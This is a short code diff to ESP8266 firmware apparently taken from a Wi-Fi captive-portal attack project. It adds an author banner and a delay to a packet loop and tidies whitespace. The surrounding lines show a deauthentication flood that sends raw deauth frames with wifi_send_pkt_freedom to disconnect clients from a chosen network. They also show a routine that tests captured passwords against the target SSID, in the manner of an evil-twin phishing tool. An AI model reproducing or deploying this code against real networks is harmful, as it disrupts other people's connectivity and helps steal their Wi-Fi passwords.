@@ -1,3 +1,8 @@
+////////////////////////////////////////////////////
+//              Made By HEINZGUENTER              //
+// github.com/heinzguenter/ESP8266-Captive-Portal //
+////////////////////////////////////////////////////
+
 #include <SoftwareSerial.h>
 #include <ESP8266WiFi.h>
 
@@ -77,13 +82,14 @@ void deauth(const int channel, String BSSIDstr){
   while(deauthing == true && WiFi.status() != 3) {
     serialCommand();
     wifi_send_pkt_freedom(deauthPacket, 26, 0); //send the deauthing package
+    delay(10);
     i++;
   }
   digitalWrite(D4, HIGH);
 }
 
 void validate(const String &targetSSID, const String &pass){
-  if (WiFi.status() == 3){ WiFi.disconnect();}
+  if (WiFi.status() == 3){ WiFi.disconnect(); }
       WiFi.begin(targetSSID, pass);
     
       int time = millis(); int i = 0;
